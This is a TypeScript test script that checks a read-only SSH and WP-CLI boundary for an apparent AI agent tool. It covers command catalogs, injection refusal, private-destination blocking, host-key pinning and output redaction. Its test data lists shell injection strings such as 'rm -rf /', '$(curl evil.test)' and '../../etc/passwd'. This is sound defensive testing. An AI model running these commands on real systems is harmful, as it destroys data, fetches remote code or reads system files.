/**
 * Executable validation for the SSH + read-only WP-CLI boundary.
 *
 * Run with: npm run check:wpcli
 *
 * The safety model is only real if it is executable, so every claim made about
 * this capability is asserted here: no arbitrary shell, no mutation, no
 * unpinned host, no private destination, no unbounded output, no credential in
 * a result, and no cross-project execution.
 */

const failures: string[] = [];
const check = (name: string, condition: boolean) => {
  if (condition) console.log(`  ok  ${name}`);
  else {
    failures.push(name);
    console.log(`FAIL  ${name}`);
  }
};

const {
  WP_CLI_READONLY_CATALOG,
  WP_CLI_COMMAND_IDS,
  buildWpCliCommand,
  catalogMutationViolations,
  argvIsMutating,
  validateWpRoot,
  validateWpBinary,
  SAFE_COMMAND_LINE,
} = await import("../supabase/functions/_shared/wpCliCatalog.ts");

const {
  clampTimeout,
  decideHostPin,
  fingerprintsMatch,
  normalizeFingerprint,
  sanitizeOutput,
  validatePrivateKey,
  validateSshDestination,
  validateSshUsername,
  SSH_ALGORITHMS,
  WP_CLI_MAX_OUTPUT_BYTES,
  WP_CLI_MAX_TIMEOUT_MS,
} = await import("../supabase/functions/_shared/sshSafety.ts");

const { runReadOnlyWpCli } = await import("../supabase/functions/_shared/wpCli.ts");
const { sealSecret, parseEncryptionKey } = await import("../supabase/functions/_shared/crypto.ts");
const { WP_CLI_READONLY_COMMAND_IDS } = await import("../src/agent-core/wpCliCommands.ts");
const { TOOL_REGISTRY, planAction } = await import("../src/agent-core/registry.ts");

// --- catalog is closed and read-only ----------------------------------------

console.log("\ncommand catalog");

check("catalog contains no mutating verb", catalogMutationViolations().length === 0);
check("mutation detector recognises a write verb", argvIsMutating(["plugin", "install", "akismet"]));
check("mutation detector ignores 'update' as a field name", !argvIsMutating(["plugin", "list", "--fields=name,update"]));
check(
  "every catalog entry is uniquely named",
  new Set(WP_CLI_COMMAND_IDS).size === WP_CLI_COMMAND_IDS.length,
);
check(
  "browser mirror matches the server catalog exactly",
  JSON.stringify([...WP_CLI_READONLY_COMMAND_IDS].sort()) === JSON.stringify([...WP_CLI_COMMAND_IDS].sort()),
);
check(
  "every catalog entry declares the params its argv uses",
  WP_CLI_READONLY_CATALOG.every((entry) =>
    entry.argv
      .filter((token) => token.startsWith(":"))
      .every((token) => entry.params.some((param) => `:${param.name}` === token)),
  ),
);

// --- no arbitrary shell ------------------------------------------------------

console.log("\nno arbitrary shell");

const INJECTIONS = [
  "akismet; rm -rf /",
  "akismet && wp plugin deactivate akismet",
  "akismet | tee /tmp/x",
  "$(curl evil.test)",
  "`id`",
  "akismet\nwp plugin delete akismet",
  "../../etc/passwd",
  "akismet' --allow-root --exec='",
  "akismet > /tmp/out",
];

for (const attempt of INJECTIONS) {
  const built = buildWpCliCommand({ commandId: "plugin.get", params: { plugin: attempt } });
  check(`injection rejected: ${JSON.stringify(attempt).slice(0, 40)}`, built.ok === false);
}

check(
  "an unknown command id is refused",
  buildWpCliCommand({ commandId: "plugin.install" }).ok === false,
);
check(
  "a free-text command cannot be smuggled through params",
  buildWpCliCommand({ commandId: "core.version", params: { plugin: "akismet" } }).ok === false,
);

const good = buildWpCliCommand({ commandId: "plugin.list", wpRoot: "/var/www/html" });
check("a valid command builds", good.ok === true);
if (good.ok) {
  check("composed command is only quoted safe tokens", SAFE_COMMAND_LINE.test(good.command));
  check("composed command carries the resolved path", good.command.includes("'--path=/var/www/html'"));
  check("composed command starts with the wp binary", good.command.startsWith("'wp' 'plugin' 'list'"));
}

const paramGood = buildWpCliCommand({ commandId: "plugin.get", params: { plugin: "Akismet" } });
check("a valid slug is accepted and normalized", paramGood.ok === true && paramGood.command.includes("'akismet'"));

// --- path + binary validation ------------------------------------------------

console.log("\npaths and binaries");

check("relative wp root refused", validateWpRoot("var/www").ok === false);
check("traversal in wp root refused", validateWpRoot("/var/www/../../etc").ok === false);
check("wp root with a space refused", validateWpRoot("/var/www html").ok === false);
check("blank wp root is allowed and means 'wherever login lands'", validateWpRoot("").ok === true);
check("bare wp binary allowed", validateWpBinary("").ok === true);
check("absolute wp binary allowed", validateWpBinary("/usr/local/bin/wp").ok === true);
check("wp binary with a metacharacter refused", validateWpBinary("/usr/bin/wp;id").ok === false);

// --- secrets are never readable through option get ---------------------------

console.log("\nsensitive settings");

for (const key of ["auth_key", "nonce_salt", "mailchimp_api_key", "smtp_password", "stripe_secret"]) {
  check(`option '${key}' refused`, buildWpCliCommand({ commandId: "option.get", params: { option: key } }).ok === false);
}
check(
  "an ordinary option is still readable",
  buildWpCliCommand({ commandId: "option.get", params: { option: "blogname" } }).ok === true,
);

// --- destination safety -------------------------------------------------------

console.log("\nssh destination safety");

for (const host of ["127.0.0.1", "localhost", "10.1.2.3", "192.168.0.5", "172.16.4.4", "169.254.169.254", "db.internal", "box.local"]) {
  check(`private destination refused: ${host}`, validateSshDestination(host, 22).ok === false);
}
check("public destination allowed", validateSshDestination("example.com", 22).ok === true);
check("port defaults to 22", (validateSshDestination("example.com", null) as { port: number }).port === 22);
check("out-of-range port refused", validateSshDestination("example.com", 99999).ok === false);
check("non-numeric port refused", validateSshDestination("example.com", "22; id").ok === false);
check("host with a metacharacter refused", validateSshDestination("example.com;id", 22).ok === false);
check("username with a metacharacter refused", validateSshUsername("root;id").ok === false);
check("ordinary username accepted", validateSshUsername("deploy-user").ok === true);

check("a non-key blob is refused", validatePrivateKey("hunter2").ok === false);
check(
  "a truncated key is refused",
  validatePrivateKey("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEA").ok === false,
);
check(
  "a well-formed key is accepted",
  validatePrivateKey(`-----BEGIN OPENSSH PRIVATE KEY-----\n${"b3BlbnNzaC1rZXktdjEAAAAA".repeat(6)}\n-----END OPENSSH PRIVATE KEY-----`).ok === true,
);

check("GCM ciphers are not offered", !SSH_ALGORITHMS.cipher.some((name) => name.includes("gcm")));
check("only CTR ciphers are offered", SSH_ALGORITHMS.cipher.every((name) => name.endsWith("-ctr")));

// --- host identity pinning -----------------------------------------------------

console.log("\nhost identity pinning");

const FP_A = "SHA256:wYuz9wU8fbt18jDQMJQjAo158a+tzk6Vi5rmcqjP7cg";
const FP_B = "SHA256:AAuz9wU8fbt18jDQMJQjAo158a+tzk6Vi5rmcqjP7cg";

check("padded fingerprint normalizes", normalizeFingerprint(`${FP_A}=`) === FP_A);
check("bare base64 normalizes", normalizeFingerprint(FP_A.slice(7)) === FP_A);
check("garbage fingerprint rejected", normalizeFingerprint("nope") === null);
check("identical fingerprints match", fingerprintsMatch(FP_A, FP_A));
check("different fingerprints do not match", !fingerprintsMatch(FP_A, FP_B));
check("null never matches", !fingerprintsMatch(FP_A, null));

check(
  "an unpinned host is refused during a normal run",
  decideHostPin(FP_A, null, false).action === "reject",
);
check(
  "an unpinned host is trusted only during an explicit verify",
  decideHostPin(FP_A, null, true).action === "trust_on_first_use",
);
check("a matching pin connects", decideHostPin(FP_A, FP_A, false).action === "match");
check("a changed host key is refused even during verify", decideHostPin(FP_B, FP_A, true).action === "reject");
check("an unreadable key is refused", decideHostPin(null, FP_A, true).action === "reject");

// --- execution bounds and output safety -----------------------------------------

console.log("\nexecution bounds and output safety");

check("timeout defaults when absent", clampTimeout(undefined) === 20_000);
check("timeout is capped", clampTimeout(10 * 60_000) === WP_CLI_MAX_TIMEOUT_MS);
check("timeout has a floor", clampTimeout(5) === 1_000);
check("nonsense timeout falls back", clampTimeout("soon") === 20_000);

const huge = sanitizeOutput("x".repeat(WP_CLI_MAX_OUTPUT_BYTES * 3));
check("oversized output is truncated", huge.truncated && huge.text.length <= WP_CLI_MAX_OUTPUT_BYTES);
check(
  "terminal control codes are stripped",
  sanitizeOutput("\u001B[31mred\u001B[0m\u0007").text === "red",
);
check(
  "long tokens in output are redacted",
  sanitizeOutput("token=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd").text.includes("[redacted]"),
);

// --- end-to-end through a fake transport -------------------------------------

console.log("\nend-to-end boundary");

const KEY = Buffer.from(new Uint8Array(32).fill(9)).toString("base64");
const PRIVATE_KEY = `-----BEGIN OPENSSH PRIVATE KEY-----\n${"b3BlbnNzaC1rZXktdjEAAAAA".repeat(6)}\n-----END OPENSSH PRIVATE KEY-----\n`;

const parsedKey = await parseEncryptionKey(KEY);
if (!parsedKey.ok) throw new Error("test encryption key did not parse");
const sealed = await sealSecret(JSON.stringify({ privateKey: PRIVATE_KEY }), parsedKey.key);

const rowFor = (overrides: Record<string, unknown> = {}) => ({
  id: "row-1",
  project_id: "p1",
  access_type: "ssh",
  provider: "ssh_private_key",
  username: "deploy",
  ciphertext: sealed.ciphertext,
  iv: sealed.iv,
  algorithm: sealed.algorithm,
  key_version: sealed.keyVersion,
  verification_state: "unverified",
  config: { host: "example.com", port: 22, wpRoot: "/var/www/html", wpBinary: "wp" },
  host_fingerprint: FP_A,
  ...overrides,
});

type Recorded = { command: string; timeoutMs: number; accepted: boolean };

const depsFor = (row: Record<string, unknown> | null) => {
  const verifications: Array<[string, string, string | null]> = [];
  const pins: string[] = [];
  return {
    verifications,
    pins,
    deps: {
      encryptionKey: KEY,
      saveRow: async () => undefined,
      loadRow: async () => row as never,
      markVerification: async (_p: string, accessType: string, state: string, at: string | null) => {
        verifications.push([accessType, state, at]);
      },
      pinHostFingerprint: async (_p: string, _a: string, fingerprint: string) => {
        pins.push(fingerprint);
      },
    },
  };
};

const transportFor = (
  outcome: Record<string, unknown>,
  presented = FP_A,
): { transport: { exec: never }; calls: Recorded[] } => {
  const calls: Recorded[] = [];
  const transport = {
    exec: async (
      _target: unknown,
      command: string,
      timeoutMs: number,
      acceptHostKey: (fingerprint: string) => boolean,
    ) => {
      const accepted = acceptHostKey(presented);
      calls.push({ command, timeoutMs, accepted });
      if (!accepted) {
        return { ok: false, kind: "host_key_rejected", fingerprint: presented, detail: "rejected" };
      }
      return outcome;
    },
  };
  return { transport: transport as never, calls };
};

{
  const { deps, verifications, pins } = depsFor(rowFor());
  const { transport, calls } = transportFor({
    ok: true,
    exitCode: 0,
    stdout: "6.5.2\n",
    stderr: "",
    fingerprint: FP_A,
    durationMs: 42,
    outputTruncated: false,
  });

  const result = await runReadOnlyWpCli(deps as never, transport as never, {
    projectId: "p1",
    commandId: "core.version",
  });

  check("a pinned, catalogued read succeeds", result.ok === true);
  check("the exact command reached the transport", calls[0]?.command === "'wp' 'core' 'version' '--no-color' '--path=/var/www/html'");
  check("a real success marks the access verified", verifications.some(([type, state]) => type === "ssh" && state === "verified"));
  check("an already-pinned host is not re-pinned", pins.length === 0);
  if (result.ok) {
    check("the result reports read-only", result.data.readOnly === true);
    check("the result carries no credential", !JSON.stringify(result.data).includes("PRIVATE KEY"));
    check("the result carries no host or username", !JSON.stringify(result.data).includes("example.com"));
  }
}

{
  const { deps, verifications } = depsFor(rowFor({ host_fingerprint: null }));
  const { transport, calls } = transportFor({ ok: true, exitCode: 0, stdout: "", stderr: "", fingerprint: FP_A, durationMs: 1, outputTruncated: false });
  const result = await runReadOnlyWpCli(deps as never, transport as never, {
    projectId: "p1",
    commandId: "core.version",
  });
  check("an unpinned host fails a normal run", result.ok === false && result.code === "host_key_rejected");
  check("the transport was told to refuse the key", calls[0]?.accepted === false);
  check("a refused connection never claims verification", verifications.length === 0);
}

{
  const { deps, pins } = depsFor(rowFor({ host_fingerprint: null }));
  const { transport } = transportFor({ ok: true, exitCode: 0, stdout: "", stderr: "", fingerprint: FP_A, durationMs: 1, outputTruncated: false });
  const result = await runReadOnlyWpCli(deps as never, transport as never, {
    projectId: "p1",
    commandId: "core.is_installed",
    allowFirstUse: true,
  });
  check("an explicit verify may pin on first use", result.ok === true);
  check("the observed identity was recorded", pins[0] === FP_A);
}

{
  const { deps } = depsFor(rowFor());
  const { transport } = transportFor(
    { ok: true, exitCode: 0, stdout: "", stderr: "", fingerprint: FP_B, durationMs: 1, outputTruncated: false },
    FP_B,
  );
  const result = await runReadOnlyWpCli(deps as never, transport as never, { projectId: "p1", commandId: "core.version" });
  check("a changed host key stops execution", result.ok === false && result.code === "host_key_rejected");
}

{
  const { deps, verifications } = depsFor(rowFor());
  const { transport } = transportFor({ ok: false, kind: "auth_failed", fingerprint: FP_A, detail: "no" });
  const result = await runReadOnlyWpCli(deps as never, transport as never, { projectId: "p1", commandId: "core.version" });
  check("a rejected key is reported honestly", result.ok === false && result.code === "auth_failed");
  check("a rejected key is recorded as rejected", verifications.some(([, state]) => state === "rejected"));
}

{
  const { deps, verifications } = depsFor(rowFor());
  const { transport } = transportFor({
    ok: true,
    exitCode: 1,
    stdout: "",
    stderr: "Error: This does not seem to be a WordPress installation.",
    fingerprint: FP_A,
    durationMs: 3,
    outputTruncated: false,
  });
  const result = await runReadOnlyWpCli(deps as never, transport as never, { projectId: "p1", commandId: "core.version" });
  check("a non-zero exit is a failure, not evidence", result.ok === false && result.code === "command_failed");
  check("a failed command never claims verification", !verifications.some(([, state]) => state === "verified"));
}

{
  const { deps } = depsFor(rowFor({ config: { host: "127.0.0.1", port: 22 } }));
  const { transport, calls } = transportFor({ ok: true, exitCode: 0, stdout: "", stderr: "", fingerprint: FP_A, durationMs: 1, outputTruncated: false });
  const result = await runReadOnlyWpCli(deps as never, transport as never, { projectId: "p1", commandId: "core.version" });
  check("a stored private destination is refused at run time", result.ok === false && result.code === "unsafe_destination");
  check("no connection was attempted for a private destination", calls.length === 0);
}

{
  const { deps } = depsFor(rowFor({ project_id: "other-project" }));
  const { transport, calls } = transportFor({ ok: true, exitCode: 0, stdout: "", stderr: "", fingerprint: FP_A, durationMs: 1, outputTruncated: false });
  const result = await runReadOnlyWpCli(deps as never, transport as never, { projectId: "p1", commandId: "core.version" });
  check("another project's credential can never be used", result.ok === false && result.code === "capability_unavailable");
  check("no connection was attempted across a project boundary", calls.length === 0);
}

{
  const { deps } = depsFor(null);
  const { transport } = transportFor({ ok: true, exitCode: 0, stdout: "", stderr: "", fingerprint: FP_A, durationMs: 1, outputTruncated: false });
  const result = await runReadOnlyWpCli(deps as never, transport as never, { projectId: "p1", commandId: "core.version" });
  check("no stored access means no execution", result.ok === false && result.code === "capability_unavailable");
}

// --- agent core wiring ---------------------------------------------------------

console.log("\nagent core wiring");

const tool = TOOL_REGISTRY["wordpress.run_wp_cli_readonly"];
check("the tool is implemented", tool.implemented === true);
check("the tool is read-only", tool.readOnly === true);
check("the tool is classified read_only", tool.risk === "read_only");
check("the tool requires ssh", tool.capability === "ssh");
check("the write WP-CLI tool is still not implemented", TOOL_REGISTRY["wordpress.execute_wp_cli"].implemented === false);

check("an unknown command id is refused by the planner", "error" in planAction("a", "wordpress.run_wp_cli_readonly", "r1", { commandId: "plugin.install" }));
check("a free-text command is refused by the planner", "error" in planAction("a", "wordpress.run_wp_cli_readonly", "r1", { command: "wp plugin list" }));

const planned = planAction("a", "wordpress.run_wp_cli_readonly", "r1", { commandId: "plugin.get", plugin: "akismet", url: "https://evil.test" });
check("a valid inspection plans", !("error" in planned));
if (!("error" in planned)) {
  check("unexpected arguments are dropped before execution", planned.args.url === undefined);
  check("the validated parameter survives", planned.args.plugin === "akismet");
  check("the invocation key is deterministic", planned.invocationKey === planAction("a", "wordpress.run_wp_cli_readonly", "r1", { commandId: "plugin.get", plugin: "akismet" }).invocationKey);
}

console.log("");
if (failures.length > 0) {
  console.log(`${failures.length} check(s) failed:`);
  for (const name of failures) console.log(`  - ${name}`);
  process.exit(1);
}
console.log("All WP-CLI read-only boundary checks passed.");